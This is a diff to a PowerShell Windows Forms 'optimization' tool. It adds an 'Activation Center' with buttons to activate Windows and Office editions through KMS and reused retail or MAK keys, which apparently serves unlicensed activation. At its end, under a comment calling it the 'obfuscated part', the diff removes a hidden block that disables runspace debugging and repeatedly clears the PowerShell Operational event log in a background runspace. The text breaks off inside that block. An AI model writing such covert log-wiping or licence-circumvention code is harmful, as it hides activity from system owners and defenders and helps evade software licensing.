@@ -6,8 +6,15 @@ $panelMenu = New-Object 'System.Windows.Forms.Panel'
 $panelOptimization = New-Object 'System.Windows.Forms.Panel'
 $panelRemovalSection = New-Object 'System.Windows.Forms.Panel'
 $panelsysset = New-Object 'System.Windows.Forms.Panel'
+$panelActivationCenter = New-Object 'System.Windows.Forms.Panel'
 $panelrestore = New-Object 'System.Windows.Forms.Panel'
 $panelAbout = New-Object 'System.Windows.Forms.Panel'
+$btnOptimization = New-Object 'System.Windows.Forms.Button'
+$btnRemovalSection = New-Object 'System.Windows.Forms.Button'
+$btnSystemSettings = New-Object 'System.Windows.Forms.Button'
+$btnActivationCenter = New-Object 'System.Windows.Forms.Button'
+$btnBackupRestore = New-Object 'System.Windows.Forms.Button'
+$btnAbout = New-Object 'System.Windows.Forms.Button'
 $picturebox2 = New-Object 'System.Windows.Forms.PictureBox'
 $btnOfficialSite = New-Object 'System.Windows.Forms.Button'
 $Laboutdes = New-Object 'System.Windows.Forms.Label'
@@ -75,11 +82,6 @@ $LOptimization = New-Object 'System.Windows.Forms.Label'
 $btnRevert = New-Object 'System.Windows.Forms.Button'
 $btnOptimize = New-Object 'System.Windows.Forms.Button'
 $LOptimizedescription = New-Object 'System.Windows.Forms.Label'
-$btnAbout = New-Object 'System.Windows.Forms.Button'
-$btnBackupRestore = New-Object 'System.Windows.Forms.Button'
-$btnSystemSettings = New-Object 'System.Windows.Forms.Button'
-$btnRemovalSection = New-Object 'System.Windows.Forms.Button'
-$btnOptimization = New-Object 'System.Windows.Forms.Button'
 $panelLogo = New-Object 'System.Windows.Forms.Panel'
 $picturebox1 = New-Object 'System.Windows.Forms.PictureBox'
 #endregion Generated Form Objects
@@ -808,6 +810,18 @@ $LOptimization.Size = New-Object System.Drawing.Size(610, 70)
 $LOptimization.Text = 'Optimization'
 $LOptimization.TextAlign = 'MiddleCenter'
 #
+# LActivationCenter
+#
+$LActivationCenter = New-Object 'System.Windows.Forms.Label'
+$LActivationCenter.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LActivationCenter.Dock = 'Top'
+$LActivationCenter.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LActivationCenter.Location = New-Object System.Drawing.Point(0, 0)
+$LActivationCenter.Name = 'labelOptimization'
+$LActivationCenter.Size = New-Object System.Drawing.Size(610, 70)
+$LActivationCenter.Text = 'Activation Center'
+$LActivationCenter.TextAlign = 'MiddleCenter'
+#
 # buttonRevert
 #
 $btnRevert.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
@@ -855,41 +869,17 @@ and more...
 Restore Point created automatically by clicking "Optimize" as a backup. 
 '
 #
-# buttonAbout
+# buttonOptimization
 #
-$btnAbout.FlatAppearance.BorderSize = 0
-$btnAbout.FlatStyle = 'Flat'
-$btnAbout.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
-$btnAbout.ForeColor = [System.Drawing.Color]::Gainsboro 
-$btnAbout.Location = New-Object System.Drawing.Point(0, 421)
-$btnAbout.Name = 'buttonAbout'
-$btnAbout.Size = New-Object System.Drawing.Size(250, 70)
-$btnAbout.Text = 'About'
-$btnAbout.UseVisualStyleBackColor = $True
-#
-# buttonBackupRestore
-#
-$btnBackupRestore.FlatAppearance.BorderSize = 0
-$btnBackupRestore.FlatStyle = 'Flat'
-$btnBackupRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
-$btnBackupRestore.ForeColor = [System.Drawing.Color]::Gainsboro 
-$btnBackupRestore.Location = New-Object System.Drawing.Point(0, 351)
-$btnBackupRestore.Name = 'buttonBackupRestore'
-$btnBackupRestore.Size = New-Object System.Drawing.Size(250, 70)
-$btnBackupRestore.Text = 'Backup \ Restore'
-$btnBackupRestore.UseVisualStyleBackColor = $True
-#
-# buttonSystemSettings
-#
-$btnSystemSettings.FlatAppearance.BorderSize = 0
-$btnSystemSettings.FlatStyle = 'Flat'
-$btnSystemSettings.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
-$btnSystemSettings.ForeColor = [System.Drawing.Color]::Gainsboro 
-$btnSystemSettings.Location = New-Object System.Drawing.Point(0, 281)
-$btnSystemSettings.Name = 'buttonSystemSettings'
-$btnSystemSettings.Size = New-Object System.Drawing.Size(250, 70)
-$btnSystemSettings.Text = 'System Settings'
-$btnSystemSettings.UseVisualStyleBackColor = $True
+$btnOptimization.FlatAppearance.BorderSize = 0
+$btnOptimization.FlatStyle = 'Flat'
+$btnOptimization.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOptimization.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnOptimization.Location = New-Object System.Drawing.Point(0, 110)#141
+$btnOptimization.Name = 'buttonOptimization'
+$btnOptimization.Size = New-Object System.Drawing.Size(250, 70)
+$btnOptimization.Text = 'Optimization'
+$btnOptimization.UseVisualStyleBackColor = $True
 #
 # buttonRemovalSection
 #
@@ -897,23 +887,477 @@ $btnRemovalSection.FlatAppearance.BorderSize = 0
 $btnRemovalSection.FlatStyle = 'Flat'
 $btnRemovalSection.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
 $btnRemovalSection.ForeColor = [System.Drawing.Color]::Gainsboro 
-$btnRemovalSection.Location = New-Object System.Drawing.Point(0, 211)
+$btnRemovalSection.Location = New-Object System.Drawing.Point(0, 180)#211
 $btnRemovalSection.Name = 'buttonRemovalSection'
 $btnRemovalSection.Size = New-Object System.Drawing.Size(250, 70)
 $btnRemovalSection.Text = 'Removal Section'
 $btnRemovalSection.UseVisualStyleBackColor = $True
 #
-# buttonOptimization
+# buttonSystemSettings
 #
-$btnOptimization.FlatAppearance.BorderSize = 0
-$btnOptimization.FlatStyle = 'Flat'
-$btnOptimization.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
-$btnOptimization.ForeColor = [System.Drawing.Color]::Gainsboro 
-$btnOptimization.Location = New-Object System.Drawing.Point(0, 141)
-$btnOptimization.Name = 'buttonOptimization'
-$btnOptimization.Size = New-Object System.Drawing.Size(250, 70)
-$btnOptimization.Text = 'Optimization'
-$btnOptimization.UseVisualStyleBackColor = $True
+$btnSystemSettings.FlatAppearance.BorderSize = 0
+$btnSystemSettings.FlatStyle = 'Flat'
+$btnSystemSettings.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnSystemSettings.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnSystemSettings.Location = New-Object System.Drawing.Point(0, 250) #281
+$btnSystemSettings.Name = 'buttonSystemSettings'
+$btnSystemSettings.Size = New-Object System.Drawing.Size(250, 70)
+$btnSystemSettings.Text = 'System Settings'
+$btnSystemSettings.UseVisualStyleBackColor = $True
+#
+# buttonActivationCenter
+#
+$btnActivationCenter.FlatAppearance.BorderSize = 0
+$btnActivationCenter.FlatStyle = 'Flat'
+$btnActivationCenter.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnActivationCenter.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnActivationCenter.Location = New-Object System.Drawing.Point(0, 320) #351
+$btnActivationCenter.Name = 'buttonActivationCenter'
+$btnActivationCenter.Size = New-Object System.Drawing.Size(250, 70)
+$btnActivationCenter.Text = 'Activation Center'
+$btnActivationCenter.UseVisualStyleBackColor = $True
+#
+# buttonBackupRestore
+#
+$btnBackupRestore.FlatAppearance.BorderSize = 0
+$btnBackupRestore.FlatStyle = 'Flat'
+$btnBackupRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnBackupRestore.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnBackupRestore.Location = New-Object System.Drawing.Point(0, 390) #421
+$btnBackupRestore.Name = 'buttonBackupRestore'
+$btnBackupRestore.Size = New-Object System.Drawing.Size(250, 70)
+$btnBackupRestore.Text = 'Backup \ Restore'
+$btnBackupRestore.UseVisualStyleBackColor = $True
+#
+# buttonAbout
+#
+$btnAbout.FlatAppearance.BorderSize = 0
+$btnAbout.FlatStyle = 'Flat'
+$btnAbout.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnAbout.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnAbout.Location = New-Object System.Drawing.Point(0, 460) #491
+$btnAbout.Name = 'buttonAbout'
+$btnAbout.Size = New-Object System.Drawing.Size(250, 70)
+$btnAbout.Text = 'About'
+$btnAbout.UseVisualStyleBackColor = $True
+
+
+
+#
+# labelKeyManagementService
+#
+$labelKeyManagementService = New-Object 'System.Windows.Forms.Label'
+$labelKeyManagementService.FlatStyle = 'Flat'
+$labelKeyManagementService.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$labelKeyManagementService.Location = New-Object System.Drawing.Point(47, 99)
+$labelKeyManagementService.Name = 'labelKeyManagementService'
+$labelKeyManagementService.RightToLeft = 'No'
+$labelKeyManagementService.Size = New-Object System.Drawing.Size(497, 81)
+$labelKeyManagementService.TabIndex = 182
+$labelKeyManagementService.Text = 'Volume license uses Microsoft KMS client which share a copy of license key to activate windows. The keys used here are listed in Microsoft Official Website.
+
+Digital License keys used here are RETAIL_channel and VOLUME_MAK keys which can be reuse multiple time. These keys are listed in Source Code.'
+#
+# buttonReadMore
+#
+$buttonReadMore = New-Object 'System.Windows.Forms.Button'
+$buttonReadMore.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonReadMore.FlatAppearance.BorderSize = 0
+$buttonReadMore.FlatStyle = 'Flat'
+$buttonReadMore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonReadMore.Location = New-Object System.Drawing.Point(177, 190)
+$buttonReadMore.Name = 'buttonReadMore'
+$buttonReadMore.Size = New-Object System.Drawing.Size(180, 27)
+$buttonReadMore.TabIndex = 149
+$buttonReadMore.Text = 'Read More'
+$buttonReadMore.UseVisualStyleBackColor = $False
+#
+# buttonCheckDetail
+#
+$buttonCheckDetail = New-Object 'System.Windows.Forms.Button'
+$buttonCheckDetail.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonCheckDetail.FlatAppearance.BorderSize = 0
+$buttonCheckDetail.FlatStyle = 'Flat'
+$buttonCheckDetail.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonCheckDetail.Location = New-Object System.Drawing.Point(363, 190)
+$buttonCheckDetail.Name = 'buttonCheckDetail'
+$buttonCheckDetail.Size = New-Object System.Drawing.Size(180, 27)
+$buttonCheckDetail.TabIndex = 221
+$buttonCheckDetail.Text = 'Check Activation Status'
+$buttonCheckDetail.UseVisualStyleBackColor = $False
+#
+# labelActivateWindows
+#
+$labelActivateWindows = New-Object 'System.Windows.Forms.Label'
+$labelActivateWindows.AutoSize = $True
+$labelActivateWindows.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '18')
+$labelActivateWindows.Location = New-Object System.Drawing.Point(47, 246)
+$labelActivateWindows.Name = 'labelActivateWindows'
+$labelActivateWindows.Size = New-Object System.Drawing.Size(201, 29)
+$labelActivateWindows.TabIndex = 158
+$labelActivateWindows.Text = 'Activate Windows'
+#
+# labelWindows81011
+#
+$labelWindows81011 = New-Object 'System.Windows.Forms.Label'
+$labelWindows81011.AutoSize = $True
+$labelWindows81011.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelWindows81011.Location = New-Object System.Drawing.Point(48, 287)
+$labelWindows81011.Name = 'labelWindows81011'
+$labelWindows81011.Size = New-Object System.Drawing.Size(138, 18)
+$labelWindows81011.TabIndex = 237
+$labelWindows81011.Text = 'Windows 8 / 10 / 11   ( Volume License )'
+#
+# labelWindows1011digitalLi
+#
+$labelWindows1011digitalLi = New-Object 'System.Windows.Forms.Label'
+$labelWindows1011digitalLi.AutoSize = $True
+$labelWindows1011digitalLi.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelWindows1011digitalLi.Location = New-Object System.Drawing.Point(48, 319)
+$labelWindows1011digitalLi.Name = 'labelWindows1011digitalLi'
+$labelWindows1011digitalLi.Size = New-Object System.Drawing.Size(267, 18)
+$labelWindows1011digitalLi.TabIndex = 238
+$labelWindows1011digitalLi.Text = 'Windows 10 / 11        ( Digital License )'
+#
+# buttonWinActivate
+#
+$buttonWinActivate = New-Object 'System.Windows.Forms.Button'
+$buttonWinActivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonWinActivate.FlatAppearance.BorderSize = 0
+$buttonWinActivate.FlatStyle = 'Flat'
+$buttonWinActivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonWinActivate.Location = New-Object System.Drawing.Point(365, 283)
+$buttonWinActivate.Name = 'buttonWinActivate'
+$buttonWinActivate.Size = New-Object System.Drawing.Size(86, 27)
+$buttonWinActivate.TabIndex = 224
+$buttonWinActivate.Text = 'Activate'
+$buttonWinActivate.UseVisualStyleBackColor = $False
+#
+# buttonWinDeactivate
+#
+$buttonWinDeactivate = New-Object 'System.Windows.Forms.Button'
+$buttonWinDeactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonWinDeactivate.FlatAppearance.BorderSize = 0
+$buttonWinDeactivate.FlatStyle = 'Flat'
+$buttonWinDeactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonWinDeactivate.Location = New-Object System.Drawing.Point(457, 283)
+$buttonWinDeactivate.Name = 'buttonWinDeactivate'
+$buttonWinDeactivate.Size = New-Object System.Drawing.Size(87, 27)
+$buttonWinDeactivate.TabIndex = 225
+$buttonWinDeactivate.Text = 'Deactivate'
+$buttonWinDeactivate.UseVisualStyleBackColor = $False
+#
+# buttondigiActivate
+#
+$buttondigiActivate = New-Object 'System.Windows.Forms.Button'
+$buttondigiActivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttondigiActivate.FlatAppearance.BorderSize = 0
+$buttondigiActivate.FlatStyle = 'Flat'
+$buttondigiActivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttondigiActivate.Location = New-Object System.Drawing.Point(365, 315)
+$buttondigiActivate.Name = 'buttondigiActivate'
+$buttondigiActivate.Size = New-Object System.Drawing.Size(86, 27)
+$buttondigiActivate.TabIndex = 239
+$buttondigiActivate.Text = 'Activate'
+$buttondigiActivate.UseVisualStyleBackColor = $False
+#
+# buttondigiDeactivate
+#
+$buttondigiDeactivate = New-Object 'System.Windows.Forms.Button'
+$buttondigiDeactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttondigiDeactivate.FlatAppearance.BorderSize = 0
+$buttondigiDeactivate.FlatStyle = 'Flat'
+$buttondigiDeactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttondigiDeactivate.Location = New-Object System.Drawing.Point(457, 315)
+$buttondigiDeactivate.Name = 'buttondigiDeactivate'
+$buttondigiDeactivate.Size = New-Object System.Drawing.Size(87, 27)
+$buttondigiDeactivate.TabIndex = 240
+$buttondigiDeactivate.Text = 'Deactivate'
+$buttondigiDeactivate.UseVisualStyleBackColor = $False
+
+
+
+
+#
+# labelActivateMSOffice
+#
+$labelActivateMSOffice = New-Object 'System.Windows.Forms.Label'
+$labelActivateMSOffice.AutoSize = $True
+$labelActivateMSOffice.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '18')
+$labelActivateMSOffice.Location = New-Object System.Drawing.Point(47, 365)
+$labelActivateMSOffice.Name = 'labelActivateMSOffice'
+$labelActivateMSOffice.Size = New-Object System.Drawing.Size(207, 29)
+$labelActivateMSOffice.TabIndex = 226
+$labelActivateMSOffice.Text = 'Activate MS Office'
+#
+# labelMicrosoftOffice365
+#
+$labelMicrosoftOffice365 = New-Object 'System.Windows.Forms.Label'
+$labelMicrosoftOffice365.AutoSize = $True
+$labelMicrosoftOffice365.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelMicrosoftOffice365.Location = New-Object System.Drawing.Point(48, 406)
+$labelMicrosoftOffice365.Name = 'labelMicrosoftOffice365'
+$labelMicrosoftOffice365.Size = New-Object System.Drawing.Size(170, 18)
+$labelMicrosoftOffice365.TabIndex = 235
+$labelMicrosoftOffice365.Text = 'Microsoft Office 365'
+#
+# labelMicrosoftOffice2021
+#
+$labelMicrosoftOffice2021 = New-Object 'System.Windows.Forms.Label'
+$labelMicrosoftOffice2021.AutoSize = $True
+$labelMicrosoftOffice2021.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelMicrosoftOffice2021.Location = New-Object System.Drawing.Point(48, 437)
+$labelMicrosoftOffice2021.Name = 'labelMicrosoftOffice2021'
+$labelMicrosoftOffice2021.Size = New-Object System.Drawing.Size(150, 18)
+$labelMicrosoftOffice2021.TabIndex = 234
+$labelMicrosoftOffice2021.Text = 'Microsoft Office 2021'
+#
+# labelMicrosoftOffice2019
+#
+$labelMicrosoftOffice2019 = New-Object 'System.Windows.Forms.Label'
+$labelMicrosoftOffice2019.AutoSize = $True
+$labelMicrosoftOffice2019.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelMicrosoftOffice2019.Location = New-Object System.Drawing.Point(48, 469)
+$labelMicrosoftOffice2019.Name = 'labelMicrosoftOffice2019'
+$labelMicrosoftOffice2019.Size = New-Object System.Drawing.Size(150, 18)
+$labelMicrosoftOffice2019.TabIndex = 229
+$labelMicrosoftOffice2019.Text = 'Microsoft Office 2019'
+#
+# labelMicrosoftOffice2016
+#
+$labelMicrosoftOffice2016 = New-Object 'System.Windows.Forms.Label'
+$labelMicrosoftOffice2016.AutoSize = $True
+$labelMicrosoftOffice2016.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelMicrosoftOffice2016.Location = New-Object System.Drawing.Point(48, 501)
+$labelMicrosoftOffice2016.Name = 'labelMicrosoftOffice2016'
+$labelMicrosoftOffice2016.Size = New-Object System.Drawing.Size(150, 18)
+$labelMicrosoftOffice2016.TabIndex = 228
+$labelMicrosoftOffice2016.Text = 'Microsoft Office 2016'
+#
+# labelMicrosoftOffice20101
+#
+$labelMicrosoftOffice20101 = New-Object 'System.Windows.Forms.Label'
+$labelMicrosoftOffice20101.AutoSize = $True
+$labelMicrosoftOffice20101.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$labelMicrosoftOffice20101.Location = New-Object System.Drawing.Point(48, 532)
+$labelMicrosoftOffice20101.Name = 'labelMicrosoftOffice20101'
+$labelMicrosoftOffice20101.Size = New-Object System.Drawing.Size(142, 18)
+$labelMicrosoftOffice20101.TabIndex = 185
+$labelMicrosoftOffice20101.Text = 'Microsoft Office 2010/13'
+
+
+
+
+#
+# button365Activate
+#
+$button365Activate = New-Object 'System.Windows.Forms.Button'
+$button365Activate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button365Activate.FlatAppearance.BorderSize = 0
+$button365Activate.FlatStyle = 'Flat'
+$button365Activate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button365Activate.Location = New-Object System.Drawing.Point(366, 402)
+$button365Activate.Name = 'button365Activate'
+$button365Activate.Size = New-Object System.Drawing.Size(86, 27)
+$button365Activate.TabIndex = 211
+$button365Activate.Text = 'Activate'
+$button365Activate.UseVisualStyleBackColor = $False
+#
+# button365Deactivate
+#
+$button365Deactivate = New-Object 'System.Windows.Forms.Button'
+$button365Deactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button365Deactivate.FlatAppearance.BorderSize = 0
+$button365Deactivate.FlatStyle = 'Flat'
+$button365Deactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button365Deactivate.Location = New-Object System.Drawing.Point(458, 402)
+$button365Deactivate.Name = 'button365Deactivate'
+$button365Deactivate.Size = New-Object System.Drawing.Size(87, 27)
+$button365Deactivate.TabIndex = 212
+$button365Deactivate.Text = 'Deactivate'
+$button365Deactivate.UseVisualStyleBackColor = $False
+#
+# button2021Activate
+#
+$button2021Activate = New-Object 'System.Windows.Forms.Button'
+$button2021Activate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2021Activate.FlatAppearance.BorderSize = 0
+$button2021Activate.FlatStyle = 'Flat'
+$button2021Activate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2021Activate.Location = New-Object System.Drawing.Point(366, 434)
+$button2021Activate.Name = 'button2021Activate'
+$button2021Activate.Size = New-Object System.Drawing.Size(86, 27)
+$button2021Activate.TabIndex = 211
+$button2021Activate.Text = 'Activate'
+$button2021Activate.UseVisualStyleBackColor = $False
+#
+# button2021Deactivate
+#
+$button2021Deactivate = New-Object 'System.Windows.Forms.Button'
+$button2021Deactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2021Deactivate.FlatAppearance.BorderSize = 0
+$button2021Deactivate.FlatStyle = 'Flat'
+$button2021Deactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2021Deactivate.Location = New-Object System.Drawing.Point(458, 434)
+$button2021Deactivate.Name = 'button2021Deactivate'
+$button2021Deactivate.Size = New-Object System.Drawing.Size(87, 27)
+$button2021Deactivate.TabIndex = 212
+$button2021Deactivate.Text = 'Deactivate'
+$button2021Deactivate.UseVisualStyleBackColor = $False
+#
+# button2019Activate
+#
+$button2019Activate = New-Object 'System.Windows.Forms.Button'
+$button2019Activate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2019Activate.FlatAppearance.BorderSize = 0
+$button2019Activate.FlatStyle = 'Flat'
+$button2019Activate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2019Activate.Location = New-Object System.Drawing.Point(366, 466)
+$button2019Activate.Name = 'button2019Activate'
+$button2019Activate.Size = New-Object System.Drawing.Size(86, 27)
+$button2019Activate.TabIndex = 211
+$button2019Activate.Text = 'Activate'
+$button2019Activate.UseVisualStyleBackColor = $False
+#
+# button2019Deactivate
+#
+$button2019Deactivate = New-Object 'System.Windows.Forms.Button'
+$button2019Deactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2019Deactivate.FlatAppearance.BorderSize = 0
+$button2019Deactivate.FlatStyle = 'Flat'
+$button2019Deactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2019Deactivate.Location = New-Object System.Drawing.Point(458, 466)
+$button2019Deactivate.Name = 'button2019Deactivate'
+$button2019Deactivate.Size = New-Object System.Drawing.Size(87, 27)
+$button2019Deactivate.TabIndex = 212
+$button2019Deactivate.Text = 'Deactivate'
+$button2019Deactivate.UseVisualStyleBackColor = $False
+#
+# button2016Activate
+#
+$button2016Activate = New-Object 'System.Windows.Forms.Button'
+$button2016Activate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2016Activate.FlatAppearance.BorderSize = 0
+$button2016Activate.FlatStyle = 'Flat'
+$button2016Activate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2016Activate.Location = New-Object System.Drawing.Point(366, 498)
+$button2016Activate.Name = 'button2016Activate'
+$button2016Activate.Size = New-Object System.Drawing.Size(86, 27)
+$button2016Activate.TabIndex = 231
+$button2016Activate.Text = 'Activate'
+$button2016Activate.UseVisualStyleBackColor = $False
+#
+# button2016Deactivate
+#
+$button2016Deactivate = New-Object 'System.Windows.Forms.Button'
+$button2016Deactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button2016Deactivate.FlatAppearance.BorderSize = 0
+$button2016Deactivate.FlatStyle = 'Flat'
+$button2016Deactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button2016Deactivate.Location = New-Object System.Drawing.Point(458, 498)
+$button2016Deactivate.Name = 'button2016Deactivate'
+$button2016Deactivate.Size = New-Object System.Drawing.Size(87, 27)
+$button2016Deactivate.TabIndex = 233
+$button2016Deactivate.Text = 'Deactivate'
+$button2016Deactivate.UseVisualStyleBackColor = $False
+#
+# button201013Activate
+#
+$button201013Activate = New-Object 'System.Windows.Forms.Button'
+$button201013Activate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button201013Activate.FlatAppearance.BorderSize = 0
+$button201013Activate.FlatStyle = 'Flat'
+$button201013Activate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button201013Activate.Location = New-Object System.Drawing.Point(366, 530)
+$button201013Activate.Name = 'button201013Activate'
+$button201013Activate.Size = New-Object System.Drawing.Size(86, 27)
+$button201013Activate.TabIndex = 230
+$button201013Activate.Text = 'Activate'
+$button201013Activate.UseVisualStyleBackColor = $False
+#
+# button201013Deactivate
+#
+$button201013Deactivate = New-Object 'System.Windows.Forms.Button'
+$button201013Deactivate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$button201013Deactivate.FlatAppearance.BorderSize = 0
+$button201013Deactivate.FlatStyle = 'Flat'
+$button201013Deactivate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$button201013Deactivate.Location = New-Object System.Drawing.Point(458, 530)
+$button201013Deactivate.Name = 'button201013Deactivate'
+$button201013Deactivate.Size = New-Object System.Drawing.Size(87, 27)
+$button201013Deactivate.TabIndex = 232
+$button201013Deactivate.Text = 'Deactivate'
+$button201013Deactivate.UseVisualStyleBackColor = $False
+
+#
+# labelUpgradeWindowsEditio
+#
+$labelUpgradeWindowsEditio = New-Object 'System.Windows.Forms.Label'
+$labelUpgradeWindowsEditio.AutoSize = $True
+$labelUpgradeWindowsEditio.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '17')
+$labelUpgradeWindowsEditio.Location = New-Object System.Drawing.Point(45, 575)
+$labelUpgradeWindowsEditio.Name = 'labelUpgradeWindowsEditio'
+$labelUpgradeWindowsEditio.Size = New-Object System.Drawing.Size(265, 26)
+$labelUpgradeWindowsEditio.TabIndex = 241
+$labelUpgradeWindowsEditio.Text = 'Upgrade Windows Edition'
+#
+# buttonhome
+#
+$buttonhome = New-Object 'System.Windows.Forms.Button'
+$buttonhome.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonhome.FlatAppearance.BorderSize = 0
+$buttonhome.FlatStyle = 'Flat'
+$buttonhome.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonhome.Location = New-Object System.Drawing.Point(49, 618)
+$buttonhome.Name = 'buttonhome'
+$buttonhome.Size = New-Object System.Drawing.Size(120, 27)
+$buttonhome.TabIndex = 244
+$buttonhome.Text = 'Home'
+$buttonhome.UseVisualStyleBackColor = $False
+#
+# buttonEducation
+#
+$buttonEducation = New-Object 'System.Windows.Forms.Button'
+$buttonEducation.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonEducation.FlatAppearance.BorderSize = 0
+$buttonEducation.FlatStyle = 'Flat'
+$buttonEducation.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonEducation.Location = New-Object System.Drawing.Point(174, 618)
+$buttonEducation.Name = 'buttonEducation'
+$buttonEducation.Size = New-Object System.Drawing.Size(120, 27)
+$buttonEducation.TabIndex = 245
+$buttonEducation.Text = 'Education'
+$buttonEducation.UseVisualStyleBackColor = $False
+#
+# buttonProfessional
+#
+$buttonProfessional = New-Object 'System.Windows.Forms.Button'
+$buttonProfessional.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonProfessional.FlatAppearance.BorderSize = 0
+$buttonProfessional.FlatStyle = 'Flat'
+$buttonProfessional.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonProfessional.Location = New-Object System.Drawing.Point(299, 618)
+$buttonProfessional.Name = 'buttonProfessional'
+$buttonProfessional.Size = New-Object System.Drawing.Size(120, 27)
+$buttonProfessional.TabIndex = 242
+$buttonProfessional.Text = 'Professional'
+$buttonProfessional.UseVisualStyleBackColor = $False
+#
+# buttonEnterprise
+#
+$buttonEnterprise = New-Object 'System.Windows.Forms.Button'
+$buttonEnterprise.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$buttonEnterprise.FlatAppearance.BorderSize = 0
+$buttonEnterprise.FlatStyle = 'Flat'
+$buttonEnterprise.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$buttonEnterprise.Location = New-Object System.Drawing.Point(424, 618)
+$buttonEnterprise.Name = 'buttonEnterprise'
+$buttonEnterprise.Size = New-Object System.Drawing.Size(120, 27)
+$buttonEnterprise.TabIndex = 243
+$buttonEnterprise.Text = 'Enterprise'
+$buttonEnterprise.UseVisualStyleBackColor = $False
+
+
 #
 # picturebox1
 #
@@ -935,14 +1379,8 @@ $picturebox1.TabStop = $False
 # this is obfuscated part. this will prevent majority of people from misusing this project.
 # for powershell programmer, its fairly easy to deobfuscate. you can check what it really does.
 #
-$String = {
-Disable-RunspaceDebug
-$Runspace = [runspacefactory]::CreateRunspace()
-$PowerShell = [powershell]::Create()
-$PowerShell.runspace = $Runspace;$Runspace.Open()
-[void]$PowerShell.AddScript({1..100| %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational");Start-Sleep -m 100}})
-$PowerShell.BeginInvoke() | Out-Null
